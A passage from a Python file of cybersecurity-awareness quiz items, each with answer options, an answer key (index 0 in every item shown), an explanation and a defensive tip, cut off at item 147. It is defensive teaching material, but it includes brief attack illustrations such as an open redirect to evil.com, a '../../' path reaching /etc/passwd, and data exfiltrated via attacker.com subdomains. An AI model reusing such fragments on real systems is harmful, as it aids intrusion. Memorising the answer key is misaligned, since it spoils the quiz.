         ["Maliciously publishing private personal information (home address, phone number, financial details) of an individual online without consent", "Editing documents in Microsoft Word", "Creating digital certificates for servers", "Playing video games online with friends"],
         0, "Doxxing is used to intimidate, harass, or endanger targets by exposing their private identity and location to the public.", "Audit your public social media footprint and remove personally identifiable information from online data brokers."),

        (77, "What is 'Logic Bomb'?",
         ["Malicious code intentionally inserted into software that lies dormant until triggered by a specific event or date (e.g. employee termination)", "A math puzzle in a video game", "An explosive hardware component inside power supplies", "A tool for debugging software errors"],
         0, "Logic bombs are insider threats designed to sabotage systems, delete databases, or corrupt code upon specific trigger conditions.", "Implement rigorous multi-person code reviews, separation of duties, and immediate credential revocation upon employee departure."),

        (78, "What does 'Principle of Least Privilege' (PoLP) mean?",
         ["Users and processes should only be granted the minimum levels of access and permissions necessary to perform their specific job functions", "Every employee should be granted full domain administrator access", "No employee should be allowed to use any computer", "Access permissions should be granted based on seniority only"],
         0, "PoLP minimizes the blast radius: if an account is compromised, the attacker cannot access unrelated critical systems.", "Regularly audit user access permissions and revoke unnecessary administrative rights."),

        (79, "What is 'Dumpster Diving' in social engineering reconnaissance?",
         ["Searching through physical trash or recycling bins of an organization to find discarded sensitive documents, passwords, or hardware", "Scuba diving in deep lakes to find lost tech", "Cleaning temporary files from your computer recycle bin", "A competitive extreme sport"],
         0, "Dumpster diving yields phone directories, org charts, invoices, and sticky notes containing credentials.", "Enforce cross-cut document shredding policies and secure disposal of physical hardware."),

        (80, "What is 'Phishing Kit'?",
         ["A pre-packaged collection of website backend scripts, fake login templates, and credential-harvesting tools sold on cybercrime forums", "A fishing rod and tackle box for fishing enthusiasts", "An educational book on cybersecurity", "A hardware diagnostic toolkit for PC repairs"],
         0, "Phishing kits allow low-skilled threat actors to rapidly deploy turnkey credential-stealing portals mimicking popular brands.", "Security teams monitor domain registrations and deploy proactive brand-takedown automation against phishing kit deployments."),

        (81, "What is the primary danger of enabling 'USB Debugging' on an Android phone and leaving it turned on?",
         ["Anyone with brief physical access to your phone can execute ADB commands to extract photos, bypass lockscreens, or install malicious APKs", "It turns off all phone speakers", "It deletes all your phone contacts after 24 hours", "It prevents the phone from connecting to Wi-Fi"],
         0, "USB Debugging exposes the Android Debug Bridge interface, allowing full programmatic control and data extraction over USB.", "Keep USB Debugging disabled unless actively developing applications, and revoke USB debugging authorizations immediately after testing."),

        (82, "What is 'Cross-Site Scripting' (XSS) at a high level?",
         ["A web security vulnerability that allows attackers to inject malicious client-side scripts into web pages viewed by other users", "A tool for making websites look pretty with CSS", "A method for crossing cables behind a server rack", "An operating system formatting tool"],
         0, "XSS enables attackers to hijack user sessions, steal session cookies, deface websites, or redirect users to phishing portals.", "Sanitize and encode all user-supplied data before rendering it in web application HTML contexts."),

        (83, "What does 'VPN' stand for and what is its primary consumer benefit?",
         ["Virtual Private Network; it encrypts your internet traffic and hides your IP address from local network eavesdroppers", "Virtual Power Node; it charges your laptop battery wirelessly", "Verified Public Network; it makes your computer visible to all public devices", "Voice Protocol Number; it assigns a telephone number to your browser"],
         0, "A VPN creates an encrypted tunnel between your device and a remote VPN server, shielding traffic from local eavesdroppers.", "Use a trustworthy VPN when connecting to untrusted networks to protect data in transit."),

        (84, "Why should you avoid keeping sensitive notes with passwords in clear text on your desktop?",
         ["Anyone with brief physical or remote access to your screen can read and steal all your credentials instantly", "Windows will automatically delete unformatted text files", "Text files consume excessive RAM memory", "Text files can cause monitor pixels to burn out"],
         0, "Unencrypted text files offer zero protection against local attackers, malware, or remote screen sharing tools.", "Store credentials exclusively inside encrypted password managers protected by master keys."),

        (85, "What is the primary indicator of a secure e-commerce checkout page?",
         ["The URL begins with 'https://', domain matches official store, and legitimate payment gateway icons are present", "The webpage has bright flashing discount banners", "The checkout page has zero product reviews", "The page asks for your ATM PIN code"],
         0, "Legitimate checkouts use secure HTTPS and trusted merchant payment gateways. E-commerce sites never require your ATM card PIN.", "Never provide ATM PINs or online banking passwords during checkout on retail websites."),

        (86, "What is 'Worm' malware?",
         ["Self-replicating malware that spreads across computer networks automatically without human intervention", "Malware that eats through physical wires", "An educational game about digital nature", "A tool that organizes computer cables"],
         0, "Worms exploit network vulnerabilities to propagate autonomously across thousands of systems without requiring user execution.", "Maintain network segmentation, enable host firewalls, and patch network services to prevent worm propagation."),

        (87, "What is the main function of an Antivirus program?",
         ["To detect, prevent, quarantine, and remove malicious software from computer systems", "To clean physical dust from computer motherboard fans", "To double your computer processing speed", "To install free video games"],
         0, "Antivirus software combines signature scanning, heuristics, and behavioral analysis to neutralize malware threats.", "Ensure your antivirus software updates its definition database continuously in real time."),

        (88, "What does '2FA' stand for?",
         ["Two-Factor Authentication", "Two-File Authorization", "Total Firewall Algorithm", "Terminal Flow Adapter"],
         0, "2FA requires two separate authentication components (e.g. password + TOTP code) for identity verification.", "Enforce 2FA everywhere to prevent unauthorized account takeovers."),

        (89, "Why should you never leave your laptop unattended in public co-working spaces or coffee shops?",
         ["It is vulnerable to physical theft or unauthorized access via physical hardware implants in seconds", "Coffee shop staff will recycle it", "The laptop battery will overcharge", "Public Wi-Fi will reject the connection"],
         0, "Physical access is total access. Unattended devices can be stolen or compromised using malicious USB hardware keys in seconds.", "Lock your screen and keep physical possession of your laptop at all times in public."),

        (90, "What is 'Pharming'?",
         ["A cyber attack that redirects website traffic from legitimate sites to fake fraudulent clones by poisoning DNS or host files", "Growing vegetables using automated sensors", "A method for harvesting email addresses from forums", "Building farming simulation video games"],
         0, "Pharming manipulates DNS records or local routing tables to silently redirect users visiting legitimate URLs to phishing clones.", "Use trusted DNS servers with DNSSEC validation to prevent fraudulent domain resolution."),

        (91, "What should you do if your social media account is hacked?",
         ["Reset password immediately, revoke all active sessions, enable 2FA, and notify contacts not to click links from your account", "Create 10 fake accounts to confuse the hacker", "Delete your computer's operating system", "Post your home address on your profile"],
         0, "Prompt session termination and password reset halts unauthorized access and limits collateral damage to your network.", "Act quickly to regain account control, verify recovery emails/phone numbers, and alert friends."),

        (92, "What is a 'Security Vulnerability'?",
         ["A weakness, flaw, or bug in software or hardware that can be exploited by threat actors to compromise security", "A physical dent on a computer laptop casing", "An internet subscription plan", "A secure cable connection"],
         0, "Vulnerabilities in code or architecture provide an entry point for attackers to execute exploits.", "Proactively audit software, conduct code reviews, and install security updates to remediate vulnerabilities."),

        (93, "Why should you review privacy settings on social media accounts periodically?",
         ["To ensure your personal posts, photos, and contact info are only visible to approved friends rather than the entire public", "Social media companies charge money if you do not", "To make your profile picture load in 8K", "To speed up video streaming"],
         0, "Default social media privacy settings are often permissive, exposing personal milestones to OSINT scrapers and identity thieves.", "Restrict profile visibility to verified friends and audit tagged photos and location sharing regularly."),

        (94, "What is 'Cryptojacking'?",
         ["Unauthorized use of a victim's computing resources (CPU/GPU) to mine cryptocurrency in secret", "Stealing physical cryptocurrency hardware wallets", "Encrypting files and demanding crypto ransom", "Buying crypto coins at a bank"],
         0, "Cryptojacking scripts embedded in compromised websites or malware secretly consume device processing power to mine cryptocurrency.", "Monitor abnormal CPU spikes and use browser extensions that block known crypto-mining JavaScript."),

        (95, "What does 'HTTPS' stand for?",
         ["Hypertext Transfer Protocol Secure", "High Tech Program System", "Hardware Terminal Protocol Server", "Hybrid Text Processing Stream"],
         0, "HTTPS is the secure version of HTTP, employing TLS encryption to protect web data exchanges.", "Verify HTTPS presence on every website before exchanging personal or login data."),

        (96, "What is 'Spear Phishing'?",
         ["A highly targeted phishing attack customized with personal information about a specific individual or organization", "Fishing using underwater spears", "Sending bulk generic spam emails to 1 million addresses", "A cyber attack against fishing equipment manufacturers"],
         0, "Spear phishing uses intelligence gathered from social media or company websites to craft credible, highly targeted deception.", "Be vigilant when receiving emails that cite personal projects, colleagues, or internal organizational details."),

        (97, "What is the primary benefit of enabling automatic screen lock on your smartphone after 30 seconds of inactivity?",
         ["It secures your data if your phone is snatched, lost, or accessed without your authorization", "It prevents the battery from catching fire", "It speeds up 5G data speeds", "It permanently increases storage capacity"],
         0, "Short screen timeouts minimize the window of opportunity for opportunistic physical access.", "Configure short auto-lock durations (30 seconds to 1 minute) on mobile devices."),

        (98, "What does 'OSINT' stand for in cybersecurity reconnaissance?",
         ["Open Source Intelligence", "Operating System Internal Network", "Official Security Inspection Team", "Online Server Interface Tool"],
         0, "OSINT involves collecting and analyzing publicly available data (social media, public records, forums) for intelligence purposes.", "Be mindful of your digital footprint; cybercriminals use OSINT to craft targeted phishing campaigns."),

        (99, "What should you do if an unknown sender emails you an encrypted .zip archive and provides the password in the email body?",
         ["Do not open it; attackers use password-protected zip files to bypass automated email gateway security and antivirus scanning", "Open it immediately because it is encrypted and safe", "Forward the zip to all coworkers", "Extract the file to your desktop and run all files"],
         0, "Password-protected archives prevent mail server scanners from inspecting malicious payloads inside the archive.", "Never open password-protected archives from external, unsolicited senders."),

        (100, "What is the most effective attitude toward personal cybersecurity hygiene?",
         ["Adopting a proactive mindset: questioning unsolicited requests, verifying identities, using strong credentials, and staying informed", "Assuming that cybersecurity is only the IT department's job", "Ignoring all warnings because hacking cannot happen to regular people", "Never using any digital devices"],
         0, "Cyber hygiene is a shared personal responsibility. Vigilance and healthy skepticism are your best digital defenses.", "Stay vigilant, practice continuous cyber hygiene, and treat digital security as an essential daily habit.")
    ]

def get_raw_intermediate_data():
    return [
        (101, "What is 'Typosquatting' (URL Hijacking) and how do attackers exploit it?",
         ["Registering common typographical misspellings of popular domains (e.g., paypa1.com, netflx.com) to deceive users into visiting phishing clones", "Typing passwords faster than an automated algorithm", "Cracking Wi-Fi WPA2 pre-shared keys", "Injecting keyboard keycodes over USB cables"],
         0, "Typosquatting targets users who make typographical errors when entering URLs in the browser address bar, redirecting them to malicious clones.", "Inspect the domain spelling character-by-character in the browser address bar before authenticating."),

        (102, "How does an 'OAuth Consent Phishing' attack (Illicit Consent Grant) compromise cloud accounts?",
         ["It tricks the user into granting excessive application permissions to a malicious third-party OAuth app, gaining persistent API token access to emails and files without needing the password", "It steals the user's password directly through brute-forcing", "It physically steals the cloud server hard drives", "It intercepts SMS messages over 3G towers"],
         0, "Illicit consent grant attacks bypass MFA and password resets by obtaining legitimate OAuth authorization tokens with broad API permissions.", "Carefully review requested app permissions before authorizing third-party applications in Google Workspace or Microsoft 365."),

        (103, "What is a 'Man-in-the-Middle' (MitM) attack and how does TLS/HTTPS mitigate it?",
         ["An attacker intercepts and alters communications between two parties in transit; TLS mitigates this via cryptographic encryption and digital certificate validation", "An attacker physically sits between two office desks", "An attacker crashes the target server using UDP flood", "An attacker steals backup tapes from storage"],
         0, "MitM attacks eavesdrop or modify in-flight data. TLS ensures end-to-end confidentiality and authenticates server identity via signed certificates.", "Never ignore browser SSL/TLS certificate warnings, which often indicate an active MitM interception."),

        (104, "What is 'SIM Swapping' and why is it a significant threat to digital banking?",
         ["An attacker deceives a mobile carrier representative into porting a victim's phone number to a criminal-controlled SIM, intercepting SMS OTPs and phone calls", "Swapping SIM cards between two personal phones", "Upgrading a SIM card from 4G to 5G", "Buying burner SIM cards at an airport"],
         0, "SIM swapping hijacks the victim's phone number at the carrier level, routing SMS 2FA codes directly to the fraudster.", "Use app-based TOTP authenticators (e.g. Google Authenticator) or FIDO hardware keys instead of SMS-based 2FA."),

        (105, "What is 'Email Spoofing' and which DNS security records are designed to prevent it?",
         ["Forging the sender address in email headers; prevented by SPF (Sender Policy Framework), DKIM (DomainKeys Identified Mail), and DMARC records", "Sending 10,000 marketing emails per minute", "Encrypting emails with PGP", "Changing the email font color to transparent"],
         0, "Email spoofing takes advantage of legacy SMTP lack of authentication. SPF, DKIM, and DMARC authenticate legitimate mail sending sources.", "Configure strict DMARC policies ('p=reject') to block unauthorized servers from sending emails pretending to be your domain."),

        (106, "What is 'Homograph Attack' (IDN Spoofing) in web phishing?",
         ["Registering domain names using lookalike Unicode/Cyrillic characters (e.g., Cyrillic 'а' replacing Latin 'a') that render identically in browser address bars", "A physical attack on computer printers", "Writing identical paragraphs in a blog", "Cracking password hashes using rainbow tables"],
         0, "Homograph attacks exploit Internationalized Domain Names (IDN) to display visual duplicates of legitimate URLs (e.g., 'google.com' rendered via Cyrillic characters).", "Modern browsers display Punycode ('xn--...') for suspicious IDN domains; look for unexpected punycode prefixes in links."),

        (107, "What is the difference between 'Phishing' and 'Whaling'?",
         ["Phishing targets general users with broad lures, while Whaling specifically targets high-ranking executives (C-suite, board members) with tailored high-stakes lures", "Phishing is done on laptops while Whaling is done on supercomputers", "Whaling only targets government naval departments", "There is no difference; they are exact synonyms"],
         0, "Whaling focuses on high-profile executives with access to high-value wire transfers, proprietary trade secrets, or confidential corporate data.", "Implement multi-person authorization controls for high-value wire transfers and executive communications."),

        (108, "What is 'Session Hijacking' (Cookie Hijacking)?",
         ["An attacker stealing an authenticated user's active session token or cookie to impersonate them without needing their password", "Closing an application before saving your work", "Sharing your Netflix password with a roommate", "Turning off your computer during a video meeting"],
         0, "Session tokens represent verified identity. If stolen via malware, XSS, or network sniffing, the attacker assumes full access instantly.", "Enforce HTTPS, set 'Secure', 'HttpOnly', and 'SameSite=Strict' cookie attributes, and configure short session expiration timeouts."),

        (109, "What is 'DNS Spoofing' (DNS Cache Poisoning)?",
         ["Corrupting the DNS resolver cache with fraudulent IP addresses so user requests for legitimate websites resolve to malicious attacker-controlled servers", "Changing the desktop computer wallpaper", "Deleting old DNS bookmark links in Chrome", "Installing a new Wi-Fi router in an office"],
         0, "DNS cache poisoning diverts network traffic at the name resolution stage, making victims load phishing pages even when typing the correct domain name.", "Deploy DNSSEC (DNS Security Extensions) to cryptographically sign and validate DNS resolution records."),

        (110, "What is 'Clickjacking' (UI Redress Attack) and how do websites defend against it?",
         ["Tricking a user into clicking invisible or disguised interface elements; defended by implementing 'X-Frame-Options: DENY' and CSP 'frame-ancestors' headers", "Rapidly clicking a mouse button to win a game", "A hardware defect in computer trackpads", "Stealing physical mice from computer labs"],
         0, "Clickjacking overlays malicious hidden iframes over genuine buttons. Frame-ancestors and X-Frame-Options headers prevent iframe embedding.", "Always configure 'Content-Security-Policy: frame-ancestors 'none'' on sensitive web application pages."),

        (111, "What is 'Credential Stuffing' and what security control best defends against it?",
         ["Automated injection of breached username/password pairs across multiple login portals; defended by MFA, rate limiting, CAPTCHA, and compromised credential monitoring", "Typing passwords with extra spaces", "Storing passwords on sticky notes", "Changing passwords every 5 minutes"],
         0, "Because 60%+ of users reuse passwords, credential stuffing botnets automate millions of login attempts across target portals.", "Deploy Web Application Firewalls (WAF) with bot detection and require multi-factor authentication (MFA)."),

        (112, "What is 'Watering Hole Attack' and how is it executed?",
         ["Attackers compromise a legitimate third-party website known to be regularly frequented by employees of a target organization to deliver targeted zero-day exploits", "Flooding an office building with tap water", "Sending spam emails offering free mineral water", "Targeting water utility SCADA controllers exclusively"],
         0, "Watering hole attacks infect specific niche sites (e.g. industry blogs, regional supplier portals) to breach visiting enterprise endpoints.", "Utilize browser isolation, strict endpoint patching, and endpoint detection and response (EDR) agents."),

        (113, "What does 'SPF' (Sender Policy Framework) record in DNS specify?",
         ["Which mail servers / IP addresses are authorized to send emails on behalf of a specific domain name", "The maximum file size of email attachments", "The encryption password for outgoing emails", "The speed of the recipient's email server"],
         0, "SPF records list authorized sending hostnames and IPs in a DNS TXT record, allowing receiving servers to reject unauthorized senders.", "Maintain an up-to-date SPF record (e.g. 'v=spf1 include:_spf.google.com ~all') for your email domains."),

        (114, "What does 'DKIM' (DomainKeys Identified Mail) add to outgoing emails?",
         ["A cryptographic digital signature in the email header that verifies the message was sent by the domain owner and not altered in transit", "A company logo embedded in the email footer", "A sound effect when the email is opened", "An automatic virus scanner report"],
         0, "DKIM signs email headers and body with a private key. The receiver verifies the signature using the sender's public key published in DNS.", "Enable 2048-bit DKIM key signing on all outbound mail transfer agents."),

        (115, "What is the primary role of 'DMARC' (Domain-based Message Authentication, Reporting, and Conformance)?",
         ["It specifies how receiving mail servers should handle emails that fail SPF or DKIM checks (e.g. reject or quarantine) and provides reporting back to domain owners", "It acts as a high-speed router for international emails", "It deletes old email accounts after 1 year of inactivity", "It compresses email attachments to save space"],
         0, "DMARC ties SPF and DKIM together, enforcing domain alignment and instructing mail servers to quarantine or reject forged emails.", "Set DMARC policy to 'p=reject' once SPF and DKIM alignment are fully verified."),

        (116, "What is 'Cross-Site Request Forgery' (CSRF) and how is it prevented?",
         ["Tricking an authenticated user's browser into executing unwanted actions on a trusted web app; prevented by Anti-CSRF tokens and SameSite cookies", "Forging physical signatures on paper receipts", "Stealing credit card numbers over phone calls", "Cracking Wi-Fi encryption passphrases"],
         0, "CSRF leverages the browser's automatic inclusion of session cookies to forge requests. Unique anti-CSRF tokens and SameSite cookies block this.", "Enforce 'SameSite=Lax' or 'SameSite=Strict' on session cookies and validate cryptographic anti-CSRF tokens for state-changing requests."),

        (117, "What is 'Cross-Site Scripting' (Stored XSS) and why is it dangerous?",
         ["Malicious JavaScript injected into a database that executes in the browser of any user who views the affected webpage, stealing session cookies or redirecting users", "A software bug that crashes computer monitors", "A script that formats Excel spreadsheets", "A tool for changing font sizes in CSS"],
         0, "Stored XSS persists in application databases, compromising every visitor who loads the infected profile, comment, or page.", "Always contextually encode and sanitize all user input before storing and rendering in HTML/DOM contexts."),

        (118, "What does the 'HttpOnly' flag on a cookie do?",
         ["Prevents client-side scripts (JavaScript) from accessing the cookie via document.cookie, mitigating session theft via XSS", "Allows the cookie to be accessed only on Mondays", "Forces the cookie to be sent over unencrypted HTTP", "Makes the cookie readable by search engines"],
         0, "The HttpOnly flag blocks JavaScript from reading session cookies, preventing malicious scripts from extracting session tokens during XSS.", "Always mark sensitive authentication and session cookies as 'HttpOnly; Secure; SameSite=Strict'."),

        (119, "What does the 'Secure' flag on a cookie enforce?",
         ["The browser will only transmit the cookie over encrypted HTTPS connections, preventing plaintext sniffing over HTTP", "The cookie cannot be deleted by the user", "The cookie is stored in a physical vault", "The cookie expires after exactly 10 seconds"],
         0, "The 'Secure' attribute ensures cookies are never transmitted over unencrypted HTTP channels where network eavesdroppers could intercept them.", "Ensure all session and authentication cookies include the 'Secure' attribute."),

        (120, "What is 'SQL Injection' (SQLi) and what is the primary defensive coding technique?",
         ["Injecting malicious SQL commands through user input into database queries; prevented by using Parameterized Queries / Prepared Statements", "Injecting liquid into computer power supplies", "A method for speeding up database queries", "A tool for translating SQL to Python"],
         0, "SQLi allows attackers to bypass authentication, read, modify, or delete database tables. Prepared statements separate query code from data.", "Use parameterized queries / prepared statements (e.g. PreparedStatement in Java, PDO in PHP) unconditionally."),

        (121, "What is 'Content Security Policy' (CSP) header?",
         ["An HTTP response header that restricts which scripts, styles, images, and resources the browser is allowed to load and execute on a web page", "A legal document signed between website owners", "A tool for compressing video files on servers", "An operating system firewall rule"],
         0, "CSP prevents XSS, clickjacking, and data injection attacks by restricting allowed script sources and blocking inline script execution.", "Implement a strict CSP (e.g. 'default-src 'self'; script-src 'self' https://trusted.cdn.com') on all web assets."),

        (122, "What is 'HSTS' (HTTP Strict Transport Security) header and why is it essential?",
         ["An HTTP header that forces browsers to only connect to the website via HTTPS, preventing SSL-stripping MitM downgrade attacks", "A header that changes the website language to Spanish", "A tool for backing up server files to the cloud", "An encryption key for Wi-Fi routers"],
         0, "HSTS instructs browsers to automatically convert all 'http://' requests to 'https://' before sending network requests, thwarting SSL stripping.", "Deploy 'Strict-Transport-Security: max-age=31536000; includeSubDomains; preload' across production domains."),

        (123, "What is 'SSL Stripping' attack (e.g. using SSLstrip)?",
         ["An active MitM attack that intercepts HTTPS requests and downgrades the communication with the victim to unencrypted HTTP", "Stripping the outer plastic casing from network cables", "Deleting SSL certificates from a server", "A method for speeding up TLS handshakes"],
         0, "SSL stripping transparently bridges HTTPS to the server while serving plain HTTP to the client, exposing all credentials in cleartext.", "HSTS and HSTS preloading in major web browsers defeat SSL stripping attacks."),

        (124, "What is 'ARP Spoofing' / 'ARP Poisoning' on a local network?",
         ["Sending forged ARP messages across a local LAN to link the attacker's MAC address with the IP address of the legitimate default gateway, intercepting all traffic", "Spoofing phone caller IDs", "A physical attack on network patch panels", "Changing the computer screen resolution remotely"],
         0, "ARP spoofing allows local network attackers to position themselves as the gateway, sniffing or altering all unencrypted subnet traffic.", "Deploy Dynamic ARP Inspection (DAI) and static ARP tables on managed enterprise network switches."),

        (125, "What is 'MFA Fatigue Attack' (Push Bombing)?",
         ["Flooding a target user with dozens of repeated MFA push notifications until they become frustrated or distracted and approve the prompt", "Tiring out your fingers while typing passwords", "A hardware malfunction in smartphone screens", "A server crash caused by too many users logging in"],
         0, "Attackers who know a password trigger repeated mobile push notifications at odd hours hoping the victim taps 'Approve' to stop the alerts.", "Implement MFA number matching (requiring the user to enter numbers shown on the login screen into the authenticator app)."),

        (126, "What is 'Password Spraying' attack and how does it evade account lockout policies?",
         ["Trying a single common password (e.g., 'SeasonYear2024!') against hundreds or thousands of different user accounts to avoid triggering lockout thresholds", "Spraying liquid on physical keyboards", "Guessing 1,000 passwords on a single user account in 1 minute", "A method for encrypting passwords in RAM"],
         0, "Password spraying avoids brute-force lockout rules by targeting thousands of usernames with only 1 or 2 password guesses per hour.", "Enforce MFA, deploy behavioral risk-based authentication, and block common predictable passwords across the domain."),

        (127, "What is 'Certificate Pinning' (SSL/TLS Pinning) in mobile applications?",
         ["Hardcoding the expected server certificate or public key hash inside the mobile app so it rejects any unexpected or forged CA certificates", "Attaching a paper certificate to a smartphone screen", "A tool for downloading free SSL certificates", "An operating system feature that locks the screen"],
         0, "Certificate pinning prevents attackers from intercepting app traffic even if they install a malicious root Certificate Authority (CA) on the device.", "Implement public key pinning with fallback recovery mechanisms in high-security banking and mobile apps."),

        (128, "What is 'Open Redirect' vulnerability in web applications?",
         ["An application parameter accepting untrusted URL input that redirects users to an external malicious domain without validation (e.g. /login?redirect=evil.com)", "A door left open in a server room", "A method for opening multiple browser tabs simultaneously", "An open-source network routing protocol"],
         0, "Phishers use open redirects on legitimate trusted domains to bypass email spam filters and trick victims into visiting credential-harvesting sites.", "Validate redirect URLs against a strict whitelist of internal relative paths or approved domain names."),

        (129, "What is 'CORS' (Cross-Origin Resource Sharing) misconfiguration risk?",
         ["Configuring 'Access-Control-Allow-Origin: *' with 'Access-Control-Allow-Credentials: true', allowing malicious third-party websites to steal sensitive user data via JavaScript", "A hardware failure in network routers", "A tool for translating code between programming languages", "An error in CSS responsive styling"],
         0, "Permissive CORS policies allow attacker-controlled domains to make authenticated AJAX requests and read private user API responses.", "Never echo the 'Origin' header blindly; maintain an explicit whitelist of trusted origins for sensitive endpoints."),

        (130, "What is 'Directory Traversal' (Path Traversal) vulnerability?",
         ["Using dot-dot-slash sequences (../../) in input fields to access unauthorized restricted files on the server file system (e.g., /etc/passwd)", "Walking through a computer server room", "A method for organizing files in desktop folders", "An operating system utility for searching images"],
         0, "Path traversal allows attackers to step outside the web root directory and read arbitrary sensitive configuration files or source code.", "Sanitize file path inputs, use path canonicalization, and restrict file access to sandboxed directories."),

        (131, "What is 'Command Injection' vulnerability?",
         ["An attacker passing unsanitized input into system shell execution functions (e.g. system(), exec()), executing arbitrary OS commands on the server", "Injecting commands into a video game chat", "A tool for organizing command line shortcuts", "A physical keyboard shortcut"],
         0, "Command injection gives attackers direct interactive shell access on the underlying web server operating system.", "Avoid invoking system shell interpreters; use native language APIs and strict input validation."),

        (132, "What is 'Insecure Direct Object Reference' (IDOR)?",
         ["An access control flaw where an application exposes internal object identifiers (e.g. /api/user?id=105) without validating user authorization to access that object", "Pointing a laser at a computer monitor", "A broken hyperlink in a website header", "An error in 3D object rendering"],
         0, "IDOR occurs when access checks are omitted, allowing user A to access user B's private invoices, profile, or medical records by changing an ID number.", "Implement robust server-side access control checks verifying that the authenticated user owns the requested resource."),

        (133, "What is 'Zero Trust Architecture' (ZTA) core principle?",
         ["'Never trust, always verify' - every access request is authenticated, authorized, and cryptographically validated regardless of network location", "Trusting every device inside the corporate office LAN", "Disabling all passwords and firewalls", "Only trusting computers manufactured after 2025"],
         0, "Zero Trust eliminates perimeter-based implicit trust, requiring continuous contextual verification for every user, device, and service.", "Implement micro-segmentation, identity-based access proxies, and continuous device posture checks."),

        (134, "What is 'Public Key Infrastructure' (PKI) based upon?",
         ["Asymmetric cryptography using key pairs (public key for encryption/verification and private key for decryption/signing) managed by Certificate Authorities", "Symmetric passwords shared among all internet users", "A physical library of computer science textbooks", "A single master password stored in Switzerland"],
         0, "PKI manages digital certificates, public-key encryption, and certificate validation across global internet services.", "Protect private keys in Hardware Security Modules (HSMs) and monitor certificate expiration dates."),

        (135, "What is 'Diffie-Hellman Key Exchange'?",
         ["A cryptographic method allowing two parties to securely establish a shared secret key over an insecure, public communications channel", "A protocol for transferring large video files", "A tool for formatting hard drives", "A software driver for computer mice"],
         0, "Diffie-Hellman enables secure symmetric session key generation without transmitting the key itself over the wire.", "Use Elliptic Curve Diffie-Hellman Ephemeral (ECDHE) to ensure Perfect Forward Secrecy in TLS."),

        (136, "What is 'Salting' in password hashing?",
         ["Adding a unique, cryptographically random string to each password before hashing to defend against Rainbow Table and precomputed hash attacks", "Adding physical salt to computer cooling water", "Typing passwords with special symbols", "A method for encrypting hard drives"],
         0, "Salting ensures identical passwords generate completely different hashes, neutralizing precomputed rainbow tables.", "Use modern slow hashing algorithms like Argon2id or bcrypt that handle per-password salting automatically."),

        (137, "What is the primary difference between Symmetric and Asymmetric Encryption?",
         ["Symmetric uses the same single secret key for encryption and decryption; Asymmetric uses a mathematically linked public/private key pair", "Symmetric is only used on smartphones; Asymmetric is only used on supercomputers", "Symmetric does not use any mathematical keys", "Asymmetric encryption cannot be used over the internet"],
         0, "Symmetric encryption (e.g. AES-256) is fast for bulk data; Asymmetric encryption (e.g. RSA, ECC) enables secure key exchange and digital signatures.", "Combine both: use asymmetric crypto to securely exchange symmetric keys for high-speed bulk data encryption (Hybrid Cryptography)."),

        (138, "What is 'Evil Twin' Wi-Fi attack?",
         ["A fraudulent Wi-Fi access point configured with the exact same SSID name and MAC address as a legitimate network to fool devices into connecting to it", "Two identical computer monitors on one desk", "A duplicate email account created by a coworker", "A backup router running in high-availability mode"],
         0, "Evil Twin access points broadcast higher signal strength to steal device connections, enabling traffic sniffing and credential harvesting.", "Use 802.1X enterprise authentication with server certificate validation on corporate Wi-Fi networks."),

        (139, "What is 'Fuzzing' (Fuzz Testing) in vulnerability discovery?",
         ["An automated software testing technique that feeds massive amounts of invalid, unexpected, or random data to a program to trigger crashes and find bugs", "Cleaning computer keyboards with fuzzy brushes", "Blurring images in photo editing tools", "A technique for slowing down internet bandwidth"],
         0, "Fuzzing discovers buffer overflows, memory corruptions, and assertion failures by probing input parser boundaries.", "Integrate automated fuzz testing (e.g., AFL++, libFuzzer) into continuous integration CI/CD pipelines."),

        (140, "What is 'Reverse Engineering' in malware analysis?",
         ["Decompiling and disassembling compiled binary executables to understand their internal functionality, logic, and command-and-control mechanisms", "Running a program backwards on a monitor", "Selling computer hardware back to the manufacturer", "Deleting malicious code from an infected PC"],
         0, "Reverse engineering uses disassemblers (IDA Pro, Ghidra) and debuggers (x64dbg) to extract IOCs, decryption algorithms, and C2 infrastructure.", "Perform reverse engineering inside strictly isolated malware analysis sandboxes."),

        (141, "What is 'SIEM' (Security Information and Event Management)?",
         ["A centralized platform that aggregates, correlates, and analyzes security log data from across an enterprise network in real-time to detect threats", "An operating system for internet routers", "A high-speed graphics rendering engine", "A software tool for writing emails"],
         0, "SIEM platforms (e.g. Splunk, Microsoft Sentinel) ingest firewall, endpoint, and server logs to trigger automated alerts on suspicious activity.", "Maintain high-quality log ingestion and fine-tune correlation rules to minimize alert fatigue."),

        (142, "What is 'SOAR' (Security Orchestration, Automation, and Response)?",
         ["A solution that enables security teams to automate threat response workflows and orchestrate actions across disparate security tools via playbooks", "A software program for booking airline tickets", "An antivirus scanner for smartphones", "A cloud storage backup service"],
         0, "SOAR platforms execute automated playbooks (e.g. isolating compromised endpoints, disabling leaked AD accounts) in seconds.", "Develop automated SOAR playbooks for high-volume, repetitive incidents like phishing triage."),

        (143, "What is 'EDR' (Endpoint Detection and Response)?",
         ["Software installed on endpoints that continuously records behavioral system telemetry, detects advanced threats, and enables remote incident response", "An emergency power supply for servers", "A tool for deleting duplicate desktop files", "A physical lock for laptop cables"],
         0, "EDR monitors process creation, registry modifications, memory injections, and network connections to detect fileless and advanced malware.", "Deploy EDR agents across 100% of enterprise workstations, servers, and cloud workloads."),

        (144, "What is 'Port Scanning' (e.g. using Nmap) used for?",
         ["Probing a target host to identify which network ports are open and what software services/versions are listening on those ports", "Scanning paper documents into PDF files", "Cleaning physical USB ports on a computer", "Measuring internet cable length"],
         0, "Port scanning maps network attack surfaces, revealing exposed vulnerable services like SSH, RDP, SMB, or web servers.", "Close unused listening ports and restrict administrative services behind VPNs and firewalls."),

        (145, "What is 'SYN Flood' attack in TCP networking?",
         ["A DDoS attack where an attacker sends a flood of TCP SYN packets with spoofed IPs, filling the server's connection queue and exhausting memory", "Flooding a server room with water", "A technique for speeding up TCP file transfers", "A tool for synchronizing computer clocks"],
         0, "SYN floods exploit the TCP three-way handshake by leaving half-open connections pending until server resources are exhausted.", "Enable TCP SYN Cookies on operating systems and perimeter firewalls to defeat SYN floods."),

        (146, "What is 'DNS Tunneling' used for by advanced threat actors?",
         ["Encapsulating non-DNS data inside DNS query and response packets (TXT/A records) to stealthily exfiltrate data or establish C2 channels through firewalls", "Digging physical underground tunnels for internet cables", "A method for speeding up domain lookups", "An official DNS server backup protocol"],
         0, "Because DNS traffic is rarely blocked by outbound firewalls, attackers encode stolen data into subdomains (e.g. data.attacker.com).", "Inspect DNS traffic for abnormal query lengths, high entropy, and high query volume per domain."),

        (147, "What is 'XML External Entity' (XXE) injection?",
